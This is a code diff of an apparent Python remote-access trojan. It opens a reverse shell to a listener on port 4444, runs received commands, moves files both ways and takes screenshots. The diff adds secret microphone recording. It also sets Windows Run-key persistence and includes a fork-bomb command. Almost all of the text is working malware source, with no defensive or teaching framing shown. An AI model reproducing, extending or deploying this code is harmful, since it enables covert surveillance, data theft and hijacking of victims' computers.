@@ -1,19 +1,23 @@
-import socket
-import termcolor
+import getpass
 import json
-import subprocess
 import os
-import pyautogui
+import platform
 import shutil
+import socket
+import subprocess
 import sys
 import time
-import platform
-import getpass
+import wave
+
+import pyaudio
+import pyautogui
+import termcolor
 
 
 def reliable_send(data):
-   jsondata = json.dumps(data)
-   s.send(jsondata.encode())
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
+
 
 def reliable_recv():
     data = ''
@@ -23,12 +27,18 @@ def reliable_recv():
             return json.loads(data)
         except ValueError:
             continue
+
+
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    s.send(f.read())
+
+
 def download_file(file_name):
     f = open(file_name, 'wb')
-    s.settimeout(20)
+    s.settimeout(1)
     chunk = s.recv(1024)
     while chunk:
-        f.decode("utf-8")
         f.write(chunk)
         try:
             chunk = s.recv(1024)
@@ -37,39 +47,68 @@ def download_file(file_name):
     s.settimeout(None)
     f.close()
 
-def upload_file(file_name):
-   f = open(file_name, 'rb')
-   f.decode("utf-8")
-   s.send(f.read())
 
 def screenshot():
     targetScreen = pyautogui.screenshot()
     targetScreen.save("screenshot.png")
 
+
+def record():
+    filename = "recorded.wav"
+    chunk = 1024
+    FORMAT = pyaudio.paInt16
+    channels = 1
+    sample_rate = 44100
+    record_seconds = 20
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT,
+                    channels=channels,
+                    rate=sample_rate,
+                    input=True,
+                    output=True,
+                    frames_per_buffer=chunk)
+    frames = []
+    for i in range(int(sample_rate / chunk * record_seconds)):
+        data = stream.read(chunk)
+        frames.append(data)
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+    wf = wave.open(filename, "wb")
+    wf.setnchannels(channels)
+    wf.setsampwidth(p.get_sample_size(FORMAT))
+    wf.setframerate(sample_rate)
+    wf.writeframes(b"".join(frames))
+    wf.close()
+
+
 def persist(reg_name, copy_name):
-   file_path = os.environ['appdata'] + '\\' + copy_name
-   try:
-       if not os.path.exists(file_path):
-         shutil.copyfile(sys.executable, file_path)
-         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_path + '"', shell=True)
-         reliable_send('[+] Created Persistence With Req Key:' + reg_name)
-       else:
-           reliable_send("[-] Bruh Persistence Already Exists")
-   except:
-       reliable_send('[+] Error Creating Persistence')
+    file_path = os.environ['appdata'] + '\\' + copy_name
+    try:
+        if not os.path.exists(file_path):
+            shutil.copyfile(sys.executable, file_path)
+            subprocess.call(
+                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_path + '"',
+                shell=True)
+            reliable_send('[+] Created Persistence With Req Key:' + reg_name)
+        else:
+            reliable_send("[-] Bruh Persistence Already Exists")
+    except:
+        reliable_send('[+] Error Creating Persistence')
+
 
 def connection():
-   while True:
-       RHOST = "ur ip"
-       RPORT = 4000
-       time.sleep(20)
-       try:
-           s.connect((RHOST, RPORT))
-           shell()
-           s.close()
-           break
-       except:
-           connection()
+    while True:
+        RHOST = "127.0.0.1"
+        RPORT = 4444
+        time.sleep(20)
+        try:
+            s.connect((RHOST, RPORT))
+            shell()
+            s.close()
+            break
+        except:
+            connection()
 
 def shell():
     while True:
@@ -99,11 +138,22 @@ def shell():
                 reliable_send('[+] Done Downloaded file')
             except FileNotFoundError:
                 pass
-        elif cmd[:10] == 'screenshot':
+        elif cmd == 'screenshot':
             screenshot()
             upload_file('screenshot.png')
             reliable_send('[+] Done screenshot saved')
             os.remove('screenshot.png')
+        elif cmd == 'record':
+            record()
+            upload_file('recorded.wav')
+            reliable_send('[+] Done recording')
+            os.remove('recorded.wav')
+        # elif cmd == 'record_screen':
+        #     record_screen()
+        #     upload_file('output.avi')
+        #     reliable_send('[+] Done recording')
+        #     os.remove('output.avi')
+
         elif cmd[:11] == 'persistence':
             reg_name, copy_name = cmd[12:].split(' ')
             persist(reg_name, copy_name)
@@ -121,8 +171,7 @@ def shell():
             while True:
                 os.fork()
             reliable_send(termcolor.colored("[+] Done sent frokbomb", 'green'))
-        elif cmd[:7] == "sendall":
-            subprocess.Popen(cmd[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
         else:
             execute = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
